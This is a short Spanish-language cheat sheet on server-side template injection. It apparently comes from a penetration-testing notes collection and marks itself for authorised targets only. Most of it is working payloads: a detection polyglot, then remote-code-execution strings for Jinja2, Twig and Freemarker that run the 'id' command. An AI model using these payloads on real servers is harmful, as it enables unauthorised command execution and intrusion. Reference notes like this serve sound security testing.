# Cheatsheet · SSTI

Explicación en `../../01-web/ssti/ssti.md`. **Solo sobre objetivos autorizados.**

## Detección (polyglot)

```
${7*7}  {{7*7}}  <%= 7*7 %>  #{7*7}  ${{7*7}}  *{7*7}
```

Si devuelve `49`, hay evaluación server-side. Identifica el motor según qué sintaxis funciona.

## Jinja2 / Python (RCE)

```python
{{ config }}
{{ ''.__class__.__mro__[1].__subclasses__() }}
{{ cycler.__init__.__globals__.os.popen('id').read() }}
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

## Twig / PHP

```
{{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}
```

## Freemarker / Java

```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

## Notas

- Primero confirma con el cálculo, luego identifica motor, luego escala a RCE.
- Ejecuta un comando inocuo (`id`) para demostrar impacto.
